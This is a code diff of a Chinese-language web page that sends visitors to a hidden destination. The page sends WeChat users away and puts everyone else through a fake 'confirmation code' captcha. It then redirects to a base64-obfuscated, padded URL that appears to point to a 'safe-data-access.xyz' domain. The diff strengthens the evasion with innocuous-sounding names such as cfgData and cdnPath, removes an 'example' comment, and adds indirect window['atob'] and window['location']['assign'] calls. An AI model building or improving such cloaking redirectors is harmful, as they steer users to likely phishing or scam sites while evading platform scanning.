@@ -23,10 +23,26 @@
       font-size: 20px;
       margin-bottom: 20px;
     }
-    .code-display {
-      font-size: 36px;
-      color: #ff5555;
+    .code-area {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 10px;
       margin-bottom: 20px;
+    }
+    canvas {
+      border: 1px solid #444;
+      cursor: pointer;
+      background-color: #fff;
+    }
+    .refresh-btn {
+      background-color: #444;
+      color: #fff;
+      border: none;
+      padding: 8px 12px;
+      font-size: 14px;
+      border-radius: 5px;
+      cursor: pointer;
     }
     input[type="text"] {
       padding: 15px;
@@ -55,58 +71,105 @@
 <body>
   <div id="wechat-warning" class="hidden">
     <div class="lock-icon">🔒</div>
-    <div class="message">请使用手机浏览器打开此页面</div>
+    <div class="message">请使用手机浏览器访问</div>
   </div>
 
   <div id="verify-box" class="hidden">
     <div class="lock-icon">🔒</div>
-    <div class="message">请输入下方验证码访问</div>
-    <div class="code-display" id="show-code">----</div>
-    <input type="text" id="code-input" maxlength="4" placeholder="验证码">
+    <div class="message">请输入下方确认码继续</div>
+    <div class="code-area">
+      <canvas id="captchaCanvas" width="120" height="40" title="换一个确认码"></canvas>
+      <button class="refresh-btn" onclick="drawCaptcha()">换一个</button>
+    </div>
+    <input type="text" id="code-input" maxlength="4" placeholder="确认码">
     <br>
     <button onclick="checkCode()">确定</button>
     <div id="error"></div>
   </div>
 
   <script>
-    function isWeChat() {
+    function isWX() {
       return /micromessenger/i.test(navigator.userAgent);
     }
 
-    const generatedCode = Math.floor(1000 + Math.random() * 9000).toString();
-    const encodedLink = "cGNrZHFodHRwczovL2NjeHgtaHVqZy1vb2pkdGh2LnNhZmUtZGF0YS1hY2Nlc3MueHl6ZmRzOA=="; // 示例加密
-    const prefixLength = 5;
-    const suffixLength = 4;
+    let code = "";
 
-    function decodeUrl(encoded) {
+    function generateCode() {
+      return Math.floor(1000 + Math.random() * 9000).toString();
+    }
+
+    function drawCaptcha() {
+      const canvas = document.getElementById("captchaCanvas");
+      const ctx = canvas.getContext("2d");
+      code = generateCode();
+
+      ctx.clearRect(0, 0, canvas.width, canvas.height);
+      ctx.fillStyle = "#f0f0f0";
+      ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+      for (let i = 0; i < code.length; i++) {
+        const fontSize = 24 + Math.random() * 8;
+        ctx.font = `${fontSize}px Arial`;
+        ctx.fillStyle = `rgb(${Math.random()*150}, ${Math.random()*150}, ${Math.random()*150})`;
+        const x = 10 + i * 25;
+        const y = 25 + Math.random() * 10;
+        ctx.fillText(code[i], x, y);
+      }
+
+      for (let i = 0; i < 4; i++) {
+        ctx.strokeStyle = `rgba(${Math.random()*255},${Math.random()*255},${Math.random()*255},0.5)`;
+        ctx.beginPath();
+        ctx.moveTo(Math.random() * canvas.width, Math.random() * canvas.height);
+        ctx.lineTo(Math.random() * canvas.width, Math.random() * canvas.height);
+        ctx.stroke();
+      }
+
+      for (let i = 0; i < 30; i++) {
+        ctx.fillStyle = `rgba(${Math.random()*255},${Math.random()*255},${Math.random()*255},0.7)`;
+        ctx.beginPath();
+        ctx.arc(Math.random()*canvas.width, Math.random()*canvas.height, 1 + Math.random()*2, 0, 2 * Math.PI);
+        ctx.fill();
+      }
+    }
+
+    const cfgData = "cGNrZHFodHRwczovL2NjeHgtaHVqZy1vb2pkdGh2LnNhZmUtZGF0YS1hY2Nlc3MueHl6ZmRzOA==";
+    const prefix = 5, suffix = 4;
+
+    function decodeData(str) {
       try {
-        const decoded = atob(encoded);
-        return decoded.slice(prefixLength, -suffixLength);
+        const raw = window["atob"](str);
+        return raw.slice(prefix, raw.length - suffix);
       } catch {
         return null;
       }
     }
 
     function checkCode() {
-      const input = document.getElementById("code-input").value.trim();
-      if (input === generatedCode) {
+      const val = document.getElementById("code-input").value.trim();
+      if (val === code) {
         document.getElementById("error").innerText = "";
-        const realUrl = decodeUrl(encodedLink);
-        if (realUrl) window.location.href = realUrl;
-        else document.getElementById("error").innerText = "加载失败，链接损坏";
+        const cdnPath = decodeData(cfgData);
+        if (cdnPath) {
+          window["location"]["assign"](cdnPath);
+        } else {
+          document.getElementById("error").innerText = "载入异常，请稍后重试";
+        }
       } else {
-        document.getElementById("error").innerText = "验证码错误，请重试";
+        document.getElementById("error").innerText = "确认码错误，请重试";
+        drawCaptcha();
       }
     }
 
-    window.onload = function () {
-      if (isWeChat()) {
+    window.onload = () => {
+      if (isWX()) {
         document.getElementById("wechat-warning").classList.remove("hidden");
       } else {
         document.getElementById("verify-box").classList.remove("hidden");
-        document.getElementById("show-code").innerText = generatedCode;
+        drawCaptcha();
       }
     };
+
+    document.getElementById("captchaCanvas").addEventListener("click", drawCaptcha);
   </script>
 </body>
 </html>
